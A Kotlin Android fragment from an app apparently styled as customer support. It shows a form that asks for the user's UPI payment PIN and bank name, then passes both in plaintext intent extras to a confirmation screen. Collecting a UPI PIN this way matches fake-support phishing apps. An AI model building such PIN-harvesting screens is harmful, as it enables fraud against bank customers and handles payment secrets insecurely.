package com.ibnghufran.supportforcustomer

import android.content.Intent
import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.Button
import android.widget.EditText
import androidx.fragment.app.Fragment

class UPIDetailsFragment : Fragment() {

    private lateinit var upiPinField: EditText
    private lateinit var bankNameField: EditText
    private lateinit var backButton: Button
    private lateinit var submitButton: Button

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        return inflater.inflate(R.layout.fragment_u_p_i_details, container, false)
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)

        // Initialize views
        upiPinField = view.findViewById(R.id.upiPinField)
        bankNameField = view.findViewById(R.id.bankNameField)
        backButton = view.findViewById(R.id.backButton)
        submitButton = view.findViewById(R.id.submitButton)

        // Set up button listeners
        backButton.setOnClickListener {
            // Go back to the previous fragment
            requireActivity().supportFragmentManager.popBackStack()
        }

        submitButton.setOnClickListener {
            // Collect data from fields
            val upiPin = upiPinField.text.toString()
            val bankName = bankNameField.text.toString()

            // Create an intent to navigate to the ConfirmationActivity
            val intent = Intent(activity, ConfirmationActivity::class.java).apply {
                putExtra("UPI_PIN", upiPin)
                putExtra("BANK_NAME", bankName)
            }
            startActivity(intent)
        }
    }
}
